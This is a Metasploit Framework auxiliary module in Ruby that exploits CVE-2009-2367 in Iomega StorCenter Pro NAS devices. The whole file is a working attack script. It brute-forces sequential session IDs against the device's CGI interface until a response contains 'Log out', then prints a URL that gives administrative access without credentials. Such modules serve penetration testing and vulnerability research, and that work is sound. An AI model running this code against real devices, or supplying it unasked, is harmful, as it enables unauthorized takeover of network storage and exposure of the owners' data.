##
# $Id: iomega_storcenterpro_sessionid.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'        => 'Iomega StorCenter Pro NAS Web Authentication Bypass',
			'Version'     => '$Revision: 9179 $',
			'Description' => %q{
				The Iomega StorCenter Pro Network Attached Storage device web interface increments sessions IDs,
				allowing for simple brute force attacks to bypass authentication and gain administrative
				access.
				},
			'References'  =>
				[
					[ 'OSVDB', '55586' ],
					[ 'CVE', '2009-2367' ],
				],
			'Author'      => [ 'patrick' ],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(80),
			], self.class)
	end

	def run
		100.times do |x|
			begin
				print_status("Searching for a valid session ID.")

				res = send_request_raw({
					'uri'     => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
					'method'  => 'GET',
				}, 25)

				if (res.to_s =~ /Log out/)
					print_status("Found valid session ID number #{x}!")
					print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}")
					break
				end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				print_status("Unable to connect to #{rhost}:#{rport}.")
				break
			rescue ::Timeout::Error, ::Errno::EPIPE
			end
		end
	end
end

